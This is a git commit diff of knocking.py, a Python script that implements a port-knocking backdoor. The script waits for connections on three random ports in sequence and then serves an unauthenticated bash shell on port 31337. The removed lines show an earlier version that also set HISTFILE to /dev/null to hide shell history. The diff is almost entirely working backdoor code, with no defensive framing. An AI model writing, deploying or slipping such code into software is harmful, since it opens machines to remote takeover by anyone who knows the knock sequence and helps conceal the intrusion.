e3e96dd115758e701f06a93737d0caf7f6b6b96f
Tom Dignan <tom@tomdignan.com>
2018-10-06 00:27:31 -0400

    clean up, don't use pty to run shell.

--- knocking.py
+++ knocking.py
@@ -1,61 +1,46 @@
 #!/usr/bin/python3
+
 from random import randint
 import socket 
 import subprocess
-import pty
 import os
-#s = socket.socket()
 
-#port = 12345
+MIN_PORT = 1200
+MAX_PORT = 2500
+SHELL_PORT = 31337
+BACKLOG = 10
 
-#s.bind(('', port))
 
-#s.listen(10)
-#message = "WElcome!\n"
-#app = "/home/pi/bind.sh"
-randport = []
-for i in range(3):
-	randport.append(randint(1025,2500))
-print(randport)
-randport.append(31337)
-print(randport)
-ports = [1111,2222,3333,4444,31337]
+def wait_for_port_knock(port, message):
+    s = socket.socket()
+    s.bind(("", port))
+    s.listen(BACKLOG)
+    conn, addr = s.accept()
+    conn.send(message.encode("utf-8"))
+    s.close()
 
-def _socket(port, message):
-	#print(str(port))
-	#print(str(message))
-	message = str(message) + "\n"
-	s = socket.socket()
-	s.bind(('', port))
-	s.listen(10)
-	conn, addr = s.accept()
-	print('Connected with ' + addr[0] + ':' + str(addr[1]))
-	conn.send(message.encode('utf-8'))
-	#pty.spawn("/bin/sh")
-	s.close()
 
-def _shell(lport):
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind(('', lport))
-	s.listen(1)
-	(rem, addr) = s.accept()
-	os.dup2(rem.fileno(),0)
-	os.dup2(rem.fileno(),1)
-	os.dup2(rem.fileno(),2)
-	os.putenv("HISTFILE",'/dev/null')
-	pty.spawn("/bin/bash")
-	s.close()
-#for elem,next_elem in zip(ports, ports[1:]+[ports[0]]):
-for elem,next_elem in zip(randport, randport[1:]):
-	_socket(elem,next_elem)
-#_socket(31337)
-_shell(31337)
-#while True:
-#        conn, addr = s.accept()
-#        print('Connected with ' + addr[0] + ':' + str(addr[1]))
-#        conn.send(message.encode('utf-8')) #send only takes string
-        #for i in range(10):
-        #pid = subprocess.Popen([app]).pid
-        #s.send('Thanks for connecting')
-#s.close()
+def give_shell(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("", port))
+    s.listen(BACKLOG)
+    (rem, addr) = s.accept()
+    child = subprocess.Popen(["/bin/bash"], stdout=rem.fileno(),
+                            stderr=rem.fileno(), stdin=rem.fileno())
+    s.close()
 
+
+if __name__ == "__main__":
+    # start listening sockets on random ports to wait for
+    # a port knock
+    rand_ports = [randint(MIN_PORT, MAX_PORT) for i in range(3)]
+    rand_ports.append(SHELL_PORT)
+
+    print(rand_ports)
+    for port, next_port in zip(rand_ports, rand_ports[1:]):
+        # wait for a connection on port, and respond with
+        # next_port
+        wait_for_port_knock(port, str(next_port))
+
+    # the user has knocked on every port, so give them a shell
+    give_shell(SHELL_PORT)
